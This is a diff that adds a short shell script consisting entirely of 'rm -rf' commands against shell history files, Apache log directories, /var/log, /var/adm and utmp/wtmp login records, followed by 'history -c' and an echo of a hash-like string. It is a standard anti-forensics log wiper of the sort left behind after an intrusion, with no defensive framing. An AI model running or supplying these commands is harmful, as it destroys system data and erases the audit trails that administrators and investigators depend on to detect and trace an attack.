@@ -1,0 +1,16 @@
+rm -rf /tmp/logs
+rm -rf /root/.ksh_history
+rm -rf /root/.bash_history
+rm -rf /root/.bash_logout
+rm -rf /usr/local/apache/logs
+rm -rf /usr/local/apache/log
+rm -rf /var/apache/logs
+rm -rf /var/apache/log
+rm -rf /var/run/utmp
+rm -rf /var/logs
+rm -rf /var/log
+rm -rf /var/adm
+rm -rf /etc/wtmp
+rm -rf /etc/utmp
+history -c
+echo "d9a400fc3cffeb03ce309d368a0f65b5"
